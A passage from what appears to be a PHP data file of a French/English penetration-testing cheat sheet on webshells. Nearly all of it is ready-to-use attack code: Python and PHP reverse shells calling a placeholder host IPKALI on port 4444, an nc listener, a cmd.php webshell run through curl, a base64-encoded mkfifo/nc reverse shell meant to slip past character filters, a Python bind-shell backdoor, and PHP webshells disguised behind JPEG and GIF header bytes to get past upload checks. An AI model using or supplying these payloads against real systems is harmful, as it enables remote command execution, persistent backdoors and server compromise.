python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IPKALI,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/bash)\'
```


',
  ),
  'Webshell-php' => 
  array (
    'category' => 'Webshell',
    'id' => 'php',
    'title' => 'Reverse shell: Php',
    'desc' => '## Reverse shell: Php

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

```
php -r \'$sock=fsockopen("IPKALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'
```


',
    'title_en' => 'Reverse shell: Php',
    'desc_en' => '## Reverse shell: Php

Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell in php on your target:
```
php -r \'$sock=fsockopen("IPKALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'
```


',
  ),
  'Webshell-webphp' => 
  array (
    'category' => 'Webshell',
    'id' => 'webphp',
    'title' => 'Web server: cmd.php',
    'desc' => '## Web server: cmd.php

Si vous pouvez uploader un fichier php sur le serveur web, le fichier ci-dessous vous permettra de lancer des commandes shell:
```
&lt?php echo \'Shell: \';system($_GET[\'cmd\']); ?>
```

Lancer la commande \'id\' sur le server
```
curl http://IPSERVER/cmd.php?cmd=id
```


',
    'title_en' => 'Web server: cmd.php',
    'desc_en' => '## Web server: cmd.php

If you can upload a php file to the web server, the file below will allow you to run shell commands:
```
&lt?php echo \'Shell: \';system($_GET[\'cmd\']); ?>
```

Run \'id\' on the server
```
curl http://IPSERVER/cmd.php?cmd=id
```


',
  ),
  'Webshell-webphp22' => 
  array (
    'category' => 'Webshell',
    'id' => 'webphp22',
    'title' => 'Web server: cmd.php (clean html)',
    'desc' => '## Web server: cmd.php (clean html)

Uploader la page
```
&ltpre>&lt?php echo \'Shell: \';system($_GET[\'cmd\']); ?>&lt/pre>
```

Lancer la commande \'id\' sur le server
```
curl http://IPSERVER/cmd.php?cmd=id
```


',
    'title_en' => 'Web server: cmd.php (clean html)',
    'desc_en' => '## Web server: cmd.php (clean html)

Upload the file
```
&ltpre>&lt?php echo \'Shell: \';system($_GET[\'cmd\']); ?>&lt/pre>
```

Run \'id\' on the server
```
curl http://IPSERVER/cmd.php?cmd=id
```


',
  ),
  'Webshell-webphpbase64' => 
  array (
    'category' => 'Webshell',
    'id' => 'webphpbase64',
    'title' => 'Web server: PHP encodage base64',
    'desc' => '## Web server: PHP encodage base64

Parfois certain caractères comme les ; les & ou les | sont filtrés. Un encodage base64 permet de s\'en sortir.<br/>
Dans un shell encoder en base64:
```
$ printf \'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f");\' | base64
```

Code PHP du reverse shell
```
eval(base64_decode(\'c3lzdGVtKCJyEtxxxxxxxxxEkgNDQ0NCA+L3RtcC9mIik7=\'));
```


',
    'title_en' => 'Web server: PHP code base64 encoded',
    'desc_en' => '## Web server: PHP code base64 encoded

Sometimes some characters like ; the & or the | are filtered. A base64 encoding allows to get out of it.<br/>
Base64 encode your command in an xterm:
```
$ printf \'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f");\' | base64
```

Paste de base64 encoded command in PHP reverse shell code:
```
eval(base64_decode(\'c3lzdGVtKCJyEtxxxxxxxxxEkgNDQ0NCA+L3RtcC9mIik7=\'));
```


',
  ),
  'Webshell-pythonbind' => 
  array (
    'category' => 'Webshell',
    'id' => 'pythonbind',
    'title' => 'Python bind shell',
    'desc' => '## Python bind shell

```
import sys,socket,time,re,subprocess,os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((\'0.0.0.0\',4444))
sock.listen(5)
conn,addr = sock.accept()
conn.send(\'== YOLO Backdoor ==\\n\\n>\')
while 1:
data = conn.recv(1024)
cmd = data.strip().split(\' \')
if cmd[0] == \'cd\':
os.chdir(cmd[1])
elif cmd[0] in (\'exit\'):
break
else:
conn.send(subprocess.check_output(cmd)+\'\\n>\')
conn.close()
sock.shutdown(socket.SHUT_RDWR)
sock.close()
```


',
    'title_en' => 'Python bind shell',
    'desc_en' => '## Python bind shell

```
import sys,socket,time,re,subprocess,os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((\'0.0.0.0\',4444))
sock.listen(5)
conn,addr = sock.accept()
conn.send(\'== YOLO Backdoor ==\\n\\n>\')
while 1:
data = conn.recv(1024)
cmd = data.strip().split(\' \')
if cmd[0] == \'cd\':
os.chdir(cmd[1])
elif cmd[0] in (\'exit\'):
break
else:
conn.send(subprocess.check_output(cmd)+\'\\n>\')
conn.close()
sock.shutdown(socket.SHUT_RDWR)
sock.close()
```


',
  ),
  'Webshell-imgwebshell' => 
  array (
    'category' => 'Webshell',
    'id' => 'imgwebshell',
    'title' => 'File upload Webshell : Jpeg',
    'desc' => '## File upload Webshell : Jpeg

Si vous pouvez upload un fichier jpg, il est possible d\'y cacher un webshell.<br/>
Un fichier jpeg est identifié par ses premiers octets qui ont la valeur : ffd8ffe0  <br/>
Pour générer un fichier qui sera identifié comme ayant une entête Jpeg valide:
```
printf &quot;\\xff\\xd8\\xff\\xe0&lt?php system(\'id\'); ?>&quot; > webshell.jpg
```

Ce fichier sera reconnu comme un fichier jpg
```
$ file webshell.jpg
webshell.jpg: JPEG image data
```


',
    'title_en' => 'File upload Webshell : Jpeg',
    'desc_en' => '## File upload Webshell : Jpeg

If you can upload a jpg file, it is possible to hide a webshell in it.<br/>
A jpeg file is identified by its first bytes which have the value: ffd8ffe0  <br/>
To generate a file that will be identified as having a valid Jpeg header:
```
printf &quot;\\xff\\xd8\\xff\\xe0&lt?php system(\'id\'); ?>&quot; > webshell.jpg
```

This file will be recognized as a jpg file
```
$ file webshell.jpg
webshell.jpg: JPEG image data
```


',
  ),
  'Webshell-imgwebshell2' => 
  array (
    'category' => 'Webshell',
    'id' => 'imgwebshell2',
    'title' => 'File upload Webshell : Gif',
    'desc' => '## File upload Webshell : Gif

Un fichier gif est identifié par ses premiers octets qui ont la valeur : GIF89a;  <br/>
Pour générer un fichier qui sera identifié comme ayant une entête gif valide:<br/>
```
printf &quot;GIF89a;&lt?php system(\'id\'); ?>&quot; > webshell.gif
```

Ce fichier sera reconnu comme un fichier gif
```
$ file webshell.gif
webshell.gif: GIF image data
```


',
    'title_en' => 'File upload Webshell : Gif',
    'desc_en' => '## File upload Webshell : Gif

A Gif file is identified by its first bytes which have the value: GIF89a;  <br/>
To generate a file that will be identified as having a valid gif header:<br/>
```
printf &quot;GIF89a;&lt?php system(\'id\'); ?>&quot; > webshell.gif
```

This file will be recognized as a gif file
```
$ file webshell.gif
webshell.gif: GIF image data
```


',
  ),
  'Webshell-payloadallthethings' => 
  array (
    'category' => 'Webshell',
    'id' => 'payloadallthethings',
    'title' => 'References: PayloadAllTheThings et PentestMonkey',
    'desc' => '## References: PayloadAllTheThings et PentestMonkey

A lire pour en savoir plus:<br/>
Liste de webshells
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```

Webshell en pure php: <a href=php-reverse-shell.php.txt>php-reverse-shell.php</a>
```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

Yop Webshell: <a href=yopwebshell.php.txt>yopwebshell.php</a><br/>
Yolo Webshell: <a href=yolowebshell.php.txt>yolowebshell.php</a>


',
    'title_en' => 'References: PayloadAllTheThings and PentestMonkey',
    'desc_en' => '## References: PayloadAllTheThings and PentestMonkey

You want to know more ?<br/>
Some webshells
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```

Pure php Webshell: <a href=php-reverse-shell.php.txt>php-reverse-shell.php</a>
```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

Yop Webshell: <a href=yopwebshell.php.txt>yopwebshell.php</a><br/>
Yolo Webshell: <a href=yolowebshell.php.txt>yolowebshell.php</a>


',
  ),
);
?>